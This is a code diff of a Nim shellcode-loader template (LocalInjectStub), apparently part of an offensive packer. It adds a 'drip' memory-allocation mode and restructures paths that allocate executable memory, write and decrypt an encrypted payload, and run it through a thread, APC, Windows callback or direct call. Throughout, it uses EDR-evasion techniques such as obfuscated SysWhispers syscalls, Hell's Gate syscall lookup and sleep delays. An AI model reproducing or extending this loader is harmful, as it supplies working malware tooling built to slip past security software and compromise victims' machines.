@@ -81,49 +81,59 @@ let LocalInjectStub*  = """
         when defined(RWX):
             protectionValue = PAGE_EXECUTE_READWRITE
         
-        when defined(SysWhispers):
-            status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-        else:
-            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-
-        
-            
-        if not NT_SUCCESS(status):
-            when defined(verbose):
-                echo obf("[-] Failed to allocate memory.")
+        when defined(AllocateDripStyle):
+            buffer = DripAllocate(HANDLE(-1), cast[SIZE_T](friendlycode.len), friendlycode)
+            if buffer == nil:
+                when defined(verbose):
+                    echo obf("[-] DripAllocation Failed")
                 quit(1)
-        else:
-            when defined(verbose):
-                when defined(RX):
-                    echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
-                else:
-                    echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
-                
-        var bytesWritten: SIZE_T
-        when defined(Hellsgate):
-            var 
-                ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
-                ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
-    
-            if getSyscall(ntWriteTable):
-
-                syscall = ntWriteTable.wSysCall
             else:
                 when defined(verbose):
-                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-            
-        when defined(SysWhispers):
-            status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
-        else:       
-            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
-
-        if not NT_SUCCESS(status):
-            when defined(verbose):
-                echo obf("[-] Failed to write memory.")
-                quit(1)
+                    echo obf("[+] DripAllocation Success!")
         else:
-            when defined(verbose):
-                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
+
+            when defined(SysWhispers):
+                status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+            else:
+                status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+
+            if not NT_SUCCESS(status):
+                when defined(verbose):
+                    echo obf("[-] Failed to allocate memory.")
+                    quit(1)
+            else:
+                when defined(verbose):
+                    when defined(RX):
+                        echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
+                    else:
+                        echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
+                
+        when not defined(AllocateDripStyle):
+            var bytesWritten: SIZE_T
+            when defined(Hellsgate):
+                var 
+                    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
+                    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
+        
+                if getSyscall(ntWriteTable):
+
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                
+            when defined(SysWhispers):
+                status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+            else:       
+                status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+
+            if not NT_SUCCESS(status):
+                when defined(verbose):
+                    echo obf("[-] Failed to write memory.")
+                    quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
         
         when defined(JmpEntry):
             var newEntry: LPVOID
@@ -131,32 +141,33 @@ let LocalInjectStub*  = """
             when defined(verbose):
                 echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry))
 
-        when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
-            when defined(sleepinbetween):
-                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-            ptrEncText = cast[ptr byte](buffer)
-            ptrDecText = cast[ptr byte](buffer)
-            decryptLate()
-        
-            when defined(Hellsgate):
-                if getSyscall(ntProtectTable):
-                    syscall = ntProtectTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+        when not defined(AllocateDripStyle):
+            when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                ptrEncText = cast[ptr byte](buffer)
+                ptrDecText = cast[ptr byte](buffer)
+                decryptLate()
+            
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
-            when defined(syswhispers):
-                status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
-            else:
-                status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
-            when defined(verbose):
-                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
-                if (status == 0):
-                    echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
-            if (status != 0):
+                when defined(syswhispers):
+                    status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
+                else:
+                    status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                 when defined(verbose):
-                    echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
-                quit(1)
+                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                    if (status == 0):
+                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to change permissions to PAGE_EXECUTE_READ")
+                    quit(1)
         
 
         when defined(QueueAPC):
@@ -203,20 +214,21 @@ let LocalInjectStub*  = """
             var tHandle: HANDLE
             when defined(JmpEntry):
                 buffer = newEntry
-            when not defined(RX):
-                when defined(sleepinbetween):
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                ptrEncText = cast[ptr byte](buffer)
-                ptrDecText = cast[ptr byte](buffer)
-                decryptLate()
-
-            when defined(SysWhispers):
+            when not defined(AllocateDripStyle):
                 when not defined(RX):
                     when defined(sleepinbetween):
                         HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                     ptrEncText = cast[ptr byte](buffer)
                     ptrDecText = cast[ptr byte](buffer)
                     decryptLate()
+
+                when defined(SysWhispers):
+                    when not defined(RX):
+                        when defined(sleepinbetween):
+                            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                        ptrEncText = cast[ptr byte](buffer)
+                        ptrDecText = cast[ptr byte](buffer)
+                        decryptLate()
                 status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                 NtWaitForSingleObject(tHandle, 0, nil)
                 when defined(JmpEntry):
@@ -281,12 +293,13 @@ let LocalInjectStub*  = """
         when defined(Callback):
             when defined(JmpEntry):
                 buffer = newEntry
-            when not defined(RX):
-                when defined(sleepinbetween):
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                ptrEncText = cast[ptr byte](buffer)
-                ptrDecText = cast[ptr byte](buffer)
-                decryptLate()
+            when defined(AllocateDripStyle):
+                when not defined(RX):
+                    when defined(sleepinbetween):
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                    ptrEncText = cast[ptr byte](buffer)
+                    ptrDecText = cast[ptr byte](buffer)
+                    decryptLate()
             discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
             when defined(JmpEntry):
                 Sleep(1000)
@@ -300,12 +313,15 @@ let LocalInjectStub*  = """
         else:
             when defined(JmpEntry):
                 buffer = newEntry
-            when not defined(RX):
-                when defined(sleepinbetween):
-                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                ptrEncText = cast[ptr byte](buffer)
-                ptrDecText = cast[ptr byte](buffer)
-                decryptlate()
+            when not defined(AllocateDripStyle):
+                when not defined(RX):
+                    when defined(sleepinbetween):
+                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                    ptrEncText = cast[ptr byte](buffer)
+                    ptrDecText = cast[ptr byte](buffer)
+                    decryptlate()
+            #write(stdout, "This is the prompt -> ")
+            #var input = readLine(stdin)
             let f = cast[proc(){.nimcall.}](buffer)
             f()
             when defined(JmpEntry):
